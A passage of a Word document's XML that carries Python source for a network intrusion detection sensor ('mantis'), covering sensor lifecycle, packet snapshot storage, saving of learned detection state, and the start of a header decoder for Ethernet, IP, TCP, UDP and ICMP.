        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02A6F15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self.packet_count = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="598504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self.unique_ports.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F14F0E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self.source_stats = {}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416BB28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self.last_time = now</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BABC2BF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="675B08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_dominant_source(self, source_stats, total_packets):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A73643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a safely attributable source for an interval alert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27D94BB5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="563A268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Aggregate rate/cluster detections cannot honestly name an address when</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FE5301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traffic is distributed. Only return the highest-volume source when it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6671849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meets the configured dominance threshold; a missing source prevents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF795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the dispatcher from attempting an unsafe firewall block.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5436EAD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9DCFD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source_stats or total_packets &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DED29D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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6BEF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 observation = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCC46B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source_stats.items(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C2B8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key=lambda item: item[1].get("packets", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5925FEC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share = observation.get("packets", 0) / float(total_packets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21ABDB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threshold = max(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59195AB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0.0, min(1.0, float(getattr(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB9164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self.config, "source_attribution_min_share", 0.50))))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2397D9A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src if share &gt;= threshold else None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13851F21" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7507F17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_record_packet(self, raw, pkt, verdict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC6DF6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"""Store a bounded snapshot in the in-memory ring buffer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04749057" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06D2160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The snapshot honours the pcap snaplen, so when privacy mode limits the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44A2C0E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capture to headers the UI hex view shows exactly what was captured and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32CF8C5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nothing more.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F482D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EF88C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snap_len = max(64, min(128, self.config.pcap_snaplen))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503C975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packet_store.STORE.add({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F85B1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"ts": time.time(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0700FCD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"time": packet_store.now_hms(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF0F27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 pkt["src"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75928C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"dst": pkt["dst"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="122CCE8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"proto": pkt["proto"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BFCC61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"sport": pkt["sport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B49775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"dport": pkt["dport"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C751E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"length": pkt["length"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541C134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"info": pkt["info"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541D98E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 verdict,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E7F18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"hex": raw[:snap_len].hex(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CDADC4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340A4F2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5204B1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lifecycle -----------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19074C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start(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47FE778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starting mantis sensor")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083B5A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print(self.config.summary())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6805AA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threading.Thread(target=self._sniffer_thread, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6DA39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threading.Thread(target=self._analyzer_thread, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="552AB2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621090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while self.is_running:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30716CD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time.sleep(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A68BB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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EE0EBE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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C81A1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self.shutdown()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="289D1442" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D1EFB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shutdown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1895AC1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print("\n[!] stopping")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40F876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self.is_running = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16EEAAA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self.pcap_writer is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D15017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self.pcap_writer.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E6DC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capture saved: %s (%d packets) - open it in Wireshark"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B237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(self.config.pcap_file, self.pcap_writer.count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6817B46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self.export_brain_state()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70705CE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self.reporter.generate()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21AA194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self.print_session_summary()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1598E50E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="259814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print_session_summary(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="564E47C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uptime = time.time() - self.started_at</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="142547C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stats = self.parser.stats()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75409C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summary = self.dispatcher.summary()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACE2A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print("\n--- session summary ---")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6230A41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uptime          : %.1f s" % uptime)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F14F9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frames decoded  : %d (non-IPv4 %d, malformed %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C1E9B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(stats["parsed"], stats["non_ipv4"], stats["malformed"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="442F593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print("  queue drops     : %d" % self.dropped)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="677E36A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alerts raised   : %d %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7003437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(summary["alerts"], summary["by_kind"]))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483FF8C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IPs blocked     : %s" % (summary["blocked_ips"] or "none"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5938E9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audit log rows  : %d -&gt; %s"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775924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(self.audit_log.rows_written, self.config.log_file))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CAC9D8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BAE399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export_brain_state(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75E317D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save what each engine learned, timestamped so we keep history</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2416545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os.makedirs(os.path.dirname(self.brain_file) or ".", exist_ok=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07AF7C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base = self.brain_file.replace(".json", "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7237F49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 = "%s_%s.json" % (base, time.strftime("%Y%m%d_%H%M%S"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B013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68F0FD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open(out, "w") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003A86F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json.dump({</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6058C6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"knn": self.knn_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48B14CD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"kmeans": self.kmeans_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54DD9D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"payload": self.payload_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F44A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"z_score": self.stats_engine.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AE59D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"bloom": self.blacklist.export_brain(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E0652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f, indent=4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9448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brain saved to", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FBABC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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79DC033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failed to save brain:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0873DF06" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="603FA9D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import_brain_state(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="056393F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auto-load the newest saved brain on boot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="582F618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base = self.brain_file.replace(".json", "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CBDAE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files = glob.glob("%s_*.json" % base)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DEDCC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files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C95C1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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DDEFD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latest = sorted(files)[-1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3746C1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loading brain", latest)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3080068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3A86266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open(latest) as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="477B34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data = json.load(f)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CA6577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key, engine in (("knn", self.knn_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747688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("kmeans", self.kmeans_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02507B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("payload", self.payload_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64907C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("z_score", self.stats_engine),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1609E5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("bloom", self.blacklist)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14B985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key in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4B3E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engine.import_brain(data[key])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB90F1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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F83CF4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failed to load brain:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB390F1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69CC1F3A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D6DE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start_sensor(stats_queue=None, alert_queue=None, brain_file=None,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1BB8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config=None, forward_alerts=False):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E94D3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SensorNode(stats_queue, alert_queue, brain_file, config,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E90E58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forward_alerts).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27C366BB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E48EE3A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1EE7D5D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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F02E6A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start_sensor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D5871AE"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src/sensor_node/parser.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="750E238F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>230 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A770E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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0480817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"""Manual decoding of Layer-2, Layer-3, and Layer-4 headers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F31FF3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A1D7A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The sensor uses a dedicated `PacketParser` outside the analyzer loop. This has</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77FDF0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three practical consequences:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640AF35C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1326EE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the decoder can be unit tested against synthetic frames with no root</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5785978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privileges and no live network;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B13A1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the offline PCAP replay tool reuses the identical decode path as the live</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B14D10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sensor, so replayed results are directly comparable to live results;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A494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malformed or truncated frames are rejected by explicit length checks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CEF1A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instead of raising struct.error inside the analyzer thread, which would</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD5C06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otherwise terminate that thread and silently stop detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624241F2" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22E8D2A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Every field is decoded with `struct` using offsets defined by the relevant</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E646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network protocol.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="152C9E89" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BCA9A0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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5684CBF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3F91F4FC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D7046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socket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="373E5C7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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E6F09B7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34D4974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ETH_HEADER_LEN = 14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ABD85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ETH_P_IPV4 = 0x0800        # RFC 894 EtherType for IPv4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33C488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ETH_P_VLAN = 0x8100        # IEEE 802.1Q tagged frame</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BA8E8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VLAN_TAG_LEN = 4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FAF5E3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26B7D0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PROTO_ICMP = 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BF9E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PROTO_TCP = 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763EBCF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PROTO_UDP = 17</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FE4DFA5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A649D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PROTO_NAMES = {PROTO_ICMP: "ICMP", PROTO_TCP: "TCP", PROTO_UDP: "UDP"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30FBFCB1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E19D21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TCP flag bits, RFC 9293 section 3.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F9C9F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TCP_FLAGS = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A9973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(0x01, "FIN"), (0x02, "SYN"), (0x04, "RST"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7319F1B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(0x08, "PSH"), (0x10, "ACK"), (0x20, "URG"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455BCFA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6E3B0EF7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6ABA01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ICMP_TYPES = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CE7012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0: "echo-reply", 3: "dest-unreachable", 5: "redirect",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4524555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8: "echo-request", 11: "time-exceeded",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEBB81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7702F684" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47B818D1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C9CF54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decode_tcp_flags(flag_byte):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7B499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names = [name for bit, name in TCP_FLAGS if flag_byte &amp; bit]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C3E0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 ".join(names) if names else "-"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="457C1DE0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4592FA0F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="328FE99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PacketParser:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56002A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"""Stateless decoder: raw Ethernet frame in, normalised dict out."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F6C687D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5CF16F6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__init__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="354AD2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self.parsed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127F1DA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self.dropped_non_ipv4 = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A1DE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self.dropped_malformed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F1C73F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B75889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parse(self, raw):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2706C8E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"""Decode one frame. Returns a dict, or None when not decodable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A550B0C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B95A4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Returning None rather than raising keeps the analyzer loop simple: any</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DE27F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frame that is not plaintext IPv4 TCP/UDP/ICMP is simply not analysed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B06D9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2686C7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raw is None or len(raw) &lt; ETH_HEADER_LEN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B1585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self.dropped_malformed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C231A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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF86981" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="73F4416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Ethernet II header (RFC 894) ---</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7E919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"!H" already yields the EtherType in host integer form, so compare it</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA53C0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against 0x0800 directly. Passing it through ntohs() as well would</w:t>
      </w:r>
    </w:p>
